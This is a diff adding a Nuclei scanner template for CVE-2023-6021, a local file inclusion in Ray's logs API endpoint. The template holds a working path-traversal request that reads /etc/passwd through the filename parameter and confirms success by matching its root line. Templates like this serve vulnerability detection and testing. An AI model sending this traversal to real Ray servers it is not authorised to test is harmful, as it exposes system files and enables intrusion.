@@ -1,0 +1,39 @@
+id: ray-log-lfi
+
+info:
+  name: Ray Log API file local file inclusion
+  author: danmcinerney (Vuln Discovery), byt3bl33d3r (Nuclei Template)
+  severity: high
+  description: Ray is vulnerable to a local file include via it's logs API endpoint
+  reference:
+    - https://huntr.com/bounties/5039c045-f986-4cbc-81ac-370fe4b0d3f8/
+  classification:
+    cvss-score: 8.6
+    cve-id: CVE-2023-6021
+    cwe-id: CWE-29
+  tags: ray,ml,cve,huntr,protectai
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nodes?view=summary"
+      - "{{BaseURL}}/api/v0/logs/file?node_id={{nodeId}}&filename=../../../../../etc%2fpasswd&lines=50000"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        part: body
+        internal: true
+        name: nodeId
+        json:
+          - '..|objects|.nodeId//empty[0]'
